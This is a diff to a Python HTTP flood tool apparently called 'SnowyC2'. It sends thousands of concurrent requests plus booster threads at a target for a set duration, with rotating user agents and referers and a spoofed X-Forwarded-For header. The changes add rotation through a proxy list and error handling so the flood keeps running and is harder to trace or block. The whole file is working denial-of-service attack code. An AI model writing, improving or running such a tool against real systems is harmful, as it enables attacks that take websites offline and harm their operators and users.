@@ -8,31 +8,28 @@ import os
 import psutil
 from concurrent.futures import ThreadPoolExecutor
 
-MAX_CONCURRENT = 3000  # Core engine size (adjustable)
-BOOSTER_THREADS = 300  # Request boosters (extra threads)
+MAX_CONCURRENT = 3000
+BOOSTER_THREADS = 300
 REQUEST_TIMEOUT = 10
 
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1)",
-    "Mozilla/5.0 (Linux; Android 12; SM-G998U)",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-    "Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0"
-]
-
-def load_referers():
+def load_list(path, fallback=[]):
     try:
-        with open("refs.txt", "r") as f:
+        with open(path, "r") as f:
             return [line.strip() for line in f if line.strip()]
     except:
-        return ["https://www.google.com/"]
+        return fallback
+
+USER_AGENTS = load_list("uas.txt", [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+])
+REFERERS = load_list("refs.txt", ["https://www.google.com/"])
+PROXIES = load_list("incognito.txt", [])
 
 class SnowyC2:
     def __init__(self, method, target, duration):
         self.method = method
         self.target = target
         self.duration = duration
-        self.referers = load_referers()
         self.stats = {
             'total': 0,
             'success': 0,
@@ -44,18 +41,23 @@ class SnowyC2:
         self.process = psutil.Process(os.getpid())
         self.lock = threading.Lock()
 
-    async def make_request(self, session):
+    def get_proxy(self):
+        if not PROXIES:
+            return None
+        return random.choice(PROXIES)
+
+    async def make_request(self, session, proxy=None):
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
-            "Referer": random.choice(self.referers),
+            "Referer": random.choice(REFERERS),
             "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
         }
+        proxy_url = f"http://{proxy}" if proxy else None
         try:
-            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
-                status = response.status
+            async with session.get(self.target, headers=headers, proxy=proxy_url, timeout=REQUEST_TIMEOUT) as resp:
                 with self.lock:
                     self.stats['total'] += 1
-                    if status == 200:
+                    if resp.status == 200:
                         self.stats['success'] += 1
                     else:
                         self.stats['errors'] += 1
@@ -68,20 +70,22 @@ class SnowyC2:
         conn = aiohttp.TCPConnector(limit_per_host=None)
         async with aiohttp.ClientSession(connector=conn) as session:
             while time.time() < self.start_time + self.duration:
-                tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
-                await asyncio.gather(*tasks)
+                tasks = [self.make_request(session, self.get_proxy()) for _ in range(MAX_CONCURRENT)]
+                await asyncio.gather(*tasks, return_exceptions=True)
 
     def booster(self):
         import requests
         session = requests.Session()
         while time.time() < self.start_time + self.duration:
             try:
+                proxy = self.get_proxy()
+                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 headers = {
                     "User-Agent": random.choice(USER_AGENTS),
-                    "Referer": random.choice(self.referers),
+                    "Referer": random.choice(REFERERS),
                     "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
                 }
-                r = session.get(self.target, headers=headers, timeout=5)
+                r = session.get(self.target, headers=headers, proxies=proxies, timeout=5)
                 with self.lock:
                     self.stats['total'] += 1
                     if r.status_code == 200:
@@ -121,14 +125,9 @@ class SnowyC2:
 
     def start(self):
         self.start_time = time.time()
-
-        # Print status in background
         threading.Thread(target=self.print_status_loop, daemon=True).start()
-
-        # Start boosters
         self.run_boosters()
 
-        # Start batch
         try:
             asyncio.run(self.batch_runner())
         except KeyboardInterrupt:
@@ -136,7 +135,6 @@ class SnowyC2:
         except Exception as e:
             print(f"Error: {e}")
 
-        # Final stats
         print("\nFINISHED")
         print("=" * 60)
         print(f"TOTAL: {self.stats['total']}")
